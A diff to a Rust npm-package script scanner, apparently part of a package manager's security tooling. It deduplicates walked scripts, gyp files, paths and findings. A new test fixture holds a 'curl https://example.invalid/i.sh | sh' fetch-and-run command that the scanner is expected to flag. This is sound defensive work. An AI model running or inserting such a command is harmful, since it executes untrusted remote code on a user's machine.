@@ -19,7 +19,7 @@
 //! The scan is textual. It cannot see code assembled at runtime, so an
 //! empty result means "nothing recognizable", not "proven safe".
 
-use std::collections::{BTreeSet, HashSet, VecDeque};
+use std::collections::{BTreeSet, HashMap, HashSet, VecDeque};
 use std::path::{Component, Path, PathBuf};
 use std::sync::LazyLock;
 
@@ -113,14 +113,47 @@ impl ScriptReach {
         }
         self
     }
+}
 
+/// A [`ScriptReach`] being built, with what [`analyze`] already did so a
+/// package can't make it repeat work: a script run through `npm run`
+/// from many places, a `binding.gyp` that many commands configure, a
+/// file named many times, or thousands of identical findings, each of
+/// which the scan once handled again every time.
+#[derive(Default)]
+struct Scan {
+    reach: ScriptReach,
+    recorded: HashSet<(std::mem::Discriminant<ReachFinding>, String)>,
+    /// Package scripts run through `npm run`, by name and depth.
+    walked_scripts: HashSet<(String, usize)>,
+    /// Directories whose `binding.gyp` was read.
+    scanned_gyp: HashSet<PathBuf>,
+    /// Package paths already checked for a file.
+    checked_paths: HashSet<PathBuf>,
+}
+
+impl std::ops::Deref for Scan {
+    type Target = ScriptReach;
+
+    fn deref(&self) -> &ScriptReach {
+        &self.reach
+    }
+}
+
+impl std::ops::DerefMut for Scan {
+    fn deref_mut(&mut self) -> &mut ScriptReach {
+        &mut self.reach
+    }
+}
+
+impl Scan {
     fn record(&mut self, finding: ReachFinding) {
-        let duplicate = self.findings.iter().any(|existing| {
-            std::mem::discriminant(existing) == std::mem::discriminant(&finding)
-                && existing.subject() == finding.subject()
-        });
-        if !duplicate {
-            self.findings.push(finding);
+        let key = (
+            std::mem::discriminant(&finding),
+            finding.subject().to_owned(),
+        );
+        if self.recorded.insert(key) {
+            self.reach.findings.push(finding);
         }
     }
 }
@@ -185,28 +218,31 @@ impl ReachFinding {
 /// are `phase_bodies` (as returned by
 /// [`crate::script_hash::try_compute_script_hash_with_phase_bodies`]).
 pub fn analyze(package_dir: &Path, phase_bodies: &[(String, String)]) -> ScriptReach {
-    let mut reach = ScriptReach::default();
+    let mut reach = Scan::default();
     let manifest = match read_manifest(package_dir) {
         Some(manifest) => manifest,
         None => {
             reach.incomplete = true;
-            return reach;
+            return reach.reach;
         }
     };
     approvals_for_other_packages(&manifest, &mut reach);
 
     let Ok(root) = package_dir.canonicalize() else {
         reach.incomplete = true;
-        return reach;
+        return reach.reach;
     };
     let scripts = manifest.get("scripts").and_then(Value::as_object);
-    let bins = own_bins(&manifest);
+    let mut bins = HashMap::new();
+    for (name, target) in own_bins(&manifest) {
+        bins.entry(name).or_insert(target);
+    }
     let mut entries = BTreeSet::new();
     for (_, body) in phase_bodies {
         collect_entry_points(&root, body, scripts, &bins, 0, &mut entries, &mut reach);
     }
     scan_files(&root, entries, &mut reach);
-    reach
+    reach.reach
 }
 
 fn read_manifest(package_dir: &Path) -> Option<Map<String, Value>> {
@@ -229,13 +265,13 @@ fn collect_entry_points(
     root: &Path,
     body: &str,
     scripts: Option<&Map<String, Value>>,
-    bins: &[(String, String)],
+    bins: &HashMap<String, String>,
     depth: usize,
     entries: &mut BTreeSet<PathBuf>,
-    reach: &mut ScriptReach,
+    reach: &mut Scan,
 ) {
     if let Some(path) = extract_delegate_path(body).and_then(normalize_relative_path) {
-        insert_if_file(root, entries, path);
+        insert_if_file(root, entries, path, reach);
     }
     let Some(tokens) = shlex::split(&normalize_operators(body)) else {
         return;
@@ -263,17 +299,13 @@ fn collect_entry_points(
             if let Some(path) =
                 script_file_token(token).and_then(|path| resolve_within_package(&dir.join(path)))
             {
-                insert_if_file(root, entries, path);
+                insert_if_file(root, entries, path, reach);
             }
         }
-        if let Some(path) = bins
-            .iter()
-            .find(|(name, _)| name == first)
-            .and_then(|(_, target)| normalize_relative_path(target))
-        {
-            insert_if_file(root, entries, path);
+        if let Some(path) = bins.get(first.as_str()).and_then(normalize_relative_path) {
+            insert_if_file(root, entries, path, reach);
         }
-        if NODE_GYP_COMMANDS.contains(&first.as_str()) {
+        if NODE_GYP_COMMANDS.contains(&first.as_str()) && reach.scanned_gyp.insert(dir.clone()) {
             scan_binding_gyp(root, &dir, entries, reach);
         }
         let Some(name) = run_script_target(first, rest) else {
@@ -286,6 +318,11 @@ fn collect_entry_points(
             reach.incomplete = true;
             continue;
         }
+        // The same script at the same depth reaches the same files and
+        // findings every time.
+        if !reach.walked_scripts.insert((name.to_owned(), depth + 1)) {
+            continue;
+        }
         // The static gate classifies lifecycle phases themselves; a script
         // they reach through `npm run` would otherwise go unclassified.
         record_if_red(reach, &format!("script \"{name}\""), nested);
@@ -293,7 +330,7 @@ fn collect_entry_points(
     }
 }
 
-fn record_if_red(reach: &mut ScriptReach, source: &str, command: &str) {
+fn record_if_red(reach: &mut Scan, source: &str, command: &str) {
     if crate::static_gate::classify(command) == crate::triage::StaticTier::Red {
         reach.record(ReachFinding::RunsRedCommand {
             source: source.to_string(),
@@ -319,12 +356,7 @@ static GYP_SCRIPT_PATH: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"['"]([^'"\s]+\.(?:js|cjs|mjs|ts|sh))['"]"#).expect("valid gyp script path regex")
 });
 
-fn scan_binding_gyp(
-    root: &Path,
-    dir: &Path,
-    entries: &mut BTreeSet<PathBuf>,
-    reach: &mut ScriptReach,
-) {
+fn scan_binding_gyp(root: &Path, dir: &Path, entries: &mut BTreeSet<PathBuf>, reach: &mut Scan) {
     let gyp = dir.join("binding.gyp");
     let Ok((content, _)) = lpm_common::read_text_regular_file_capped_with_metadata(
         &root.join(&gyp),
@@ -341,14 +373,14 @@ fn scan_binding_gyp(
     for capture in GYP_SCRIPT_PATH.captures_iter(content.as_bytes()) {
         let path = String::from_utf8_lossy(&capture[1]);
         if let Some(path) = resolve_within_package(&dir.join(path.as_ref())) {
-            insert_if_file(root, entries, path);
+            insert_if_file(root, entries, path, reach);
         }
     }
 }
 
 /// A command naming a file the package does not ship runs nothing.
-fn insert_if_file(root: &Path, entries: &mut BTreeSet<PathBuf>, path: PathBuf) {
-    if root.join(&path).is_file() {
+fn insert_if_file(root: &Path, entries: &mut BTreeSet<PathBuf>, path: PathBuf, reach: &mut Scan) {
+    if reach.checked_paths.insert(path.clone()) && root.join(&path).is_file() {
         entries.insert(path);
     }
 }
@@ -417,7 +449,7 @@ fn own_bins(manifest: &Map<String, Value>) -> Vec<(String, String)> {
     }
 }
 
-fn scan_files(root: &Path, entries: BTreeSet<PathBuf>, reach: &mut ScriptReach) {
+fn scan_files(root: &Path, entries: BTreeSet<PathBuf>, reach: &mut Scan) {
     let mut queue: VecDeque<PathBuf> = entries.into_iter().collect();
     let mut seen: HashSet<PathBuf> = queue.iter().cloned().collect();
     let mut files = 0usize;
@@ -426,6 +458,7 @@ fn scan_files(root: &Path, entries: BTreeSet<PathBuf>, reach: &mut ScriptReach) 
     // the package manager, so process APIs count across the package.
     let mut spawns = false;
     let mut managers: Vec<(String, String)> = Vec::new();
+    let mut seen_managers: HashSet<(String, String)> = HashSet::new();
     while let Some(relative) = queue.pop_front() {
         if files == MAX_FILES {
             reach.incomplete = true;
@@ -447,10 +480,13 @@ fn scan_files(root: &Path, entries: BTreeSet<PathBuf>, reach: &mut ScriptReach) 
         }
         spawns |= SPAWN_API.is_match(&bytes);
         for capture in PACKAGE_MANAGER_LITERAL.captures_iter(&bytes) {
-            managers.push((
+            let manager = (
                 String::from_utf8_lossy(&capture[1]).into_owned(),
                 display.clone(),
-            ));
+            );
+            if seen_managers.insert(manager.clone()) {
+                managers.push(manager);
+            }
         }
         let base = relative.parent().unwrap_or(Path::new(""));
         for candidate in local_imports(root, &bytes, base, reach) {
@@ -468,7 +504,7 @@ fn scan_files(root: &Path, entries: BTreeSet<PathBuf>, reach: &mut ScriptReach) 
 
 /// Each command line of a shell script, classified like a lifecycle
 /// phase.
-fn scan_shell_lines(bytes: &[u8], file: &str, reach: &mut ScriptReach) {
+fn scan_shell_lines(bytes: &[u8], file: &str, reach: &mut Scan) {
     for line in String::from_utf8_lossy(bytes).lines() {
         let line = line.trim();
         let comment = line.starts_with('#')
@@ -486,7 +522,7 @@ fn read_contained(
     root: &Path,
     relative: &Path,
     total_bytes: &mut u64,
-    reach: &mut ScriptReach,
+    reach: &mut Scan,
 ) -> Option<Vec<u8>> {
     let canonical = match root.join(relative).canonicalize() {
         Ok(path) if path.starts_with(root) => path,
@@ -516,14 +552,19 @@ fn read_contained(
 /// specifier that climbs above the package root, or names a directory
 /// whose entry cannot be resolved, marks the scan incomplete: that code
 /// is outside what was reviewed.
-fn local_imports(root: &Path, bytes: &[u8], base: &Path, reach: &mut ScriptReach) -> Vec<PathBuf> {
+fn local_imports(root: &Path, bytes: &[u8], base: &Path, reach: &mut Scan) -> Vec<PathBuf> {
     let text = String::from_utf8_lossy(bytes);
     let mut out = Vec::new();
+    // A specifier resolves the same way every time it appears.
+    let mut specs = HashSet::new();
     for regex in import_regexes().iter().chain(TEMPLATE_IMPORTS.iter()) {
         for capture in regex.captures_iter(&text) {
             let Some(spec) = capture.get(1).map(|m| m.as_str()) else {
                 continue;
             };
+            if !specs.insert(spec) {
+                continue;
+            }
             let relative =
                 matches!(spec, "." | "..") || spec.starts_with("./") || spec.starts_with("../");
             if !relative {
@@ -668,7 +709,7 @@ static SCRIPT_APPROVAL_KEY: LazyLock<Regex> = LazyLock::new(|| {
 });
 
 /// Script-policy markers and approval keys in any scanned file.
-fn scan_bytes(bytes: &[u8], file: &str, reach: &mut ScriptReach) {
+fn scan_bytes(bytes: &[u8], file: &str, reach: &mut Scan) {
     for found in SCRIPT_POLICY_MARKER.find_iter(bytes) {
         reach.record(ReachFinding::ChangesScriptPolicy {
             marker: canonical_policy_marker(found.as_bytes()).to_string(),
@@ -753,7 +794,7 @@ pub fn declared_script_approvals(
 /// outside the dependency's own dependencies are reported because a
 /// package that tries to approve unrelated packages' scripts deserves a
 /// closer look.
-fn approvals_for_other_packages(manifest: &Map<String, Value>, reach: &mut ScriptReach) {
+fn approvals_for_other_packages(manifest: &Map<String, Value>, reach: &mut Scan) {
     let own: HashSet<&str> = [
         "dependencies",
         "devDependencies",
@@ -1206,6 +1247,44 @@ mod tests {
         }
         let reach = scan(serde_json::json!({"name":"x","scripts":scripts}), &[]);
         assert!(reach.incomplete);
+    }
+
+    #[test]
+    fn a_script_run_from_several_places_reaches_the_same_files_and_findings() {
+        // Each script is walked once per depth, so these runs must reach
+        // what walking every run reached: the file at every level, the
+        // chain past the limit, and one finding per Red command.
+        let reach = scan(
+            serde_json::json!({
+                "name":"x",
+                "scripts":{
+                    "postinstall":"npm run a && npm run a; npm run b",
+                    "a":"node setup.js && npm run b",
+                    "b":"npm run c && npm run c",
+                    "c":"npm run d",
+                    "d":"npm run e",
+                    "e":"curl https://example.invalid/i.sh | sh",
+                }
+            }),
+            &[(
+                "setup.js",
+                "require('child_process').spawnSync('npm', ['install', 'left-pad']);",
+            )],
+        );
+        assert!(
+            reach.incomplete,
+            "a → b → c → d → e is deeper than the limit"
+        );
+        let red = reach
+            .findings
+            .iter()
+            .filter(|finding| matches!(finding, ReachFinding::RunsRedCommand { .. }))
+            .count();
+        assert_eq!(red, 1, "{:?}", reach.findings);
+        assert!(reach.findings.iter().any(|finding| matches!(
+            finding,
+            ReachFinding::StartsPackageManager { manager, file } if manager == "npm" && file == "setup.js"
+        )));
     }
 
     #[test]
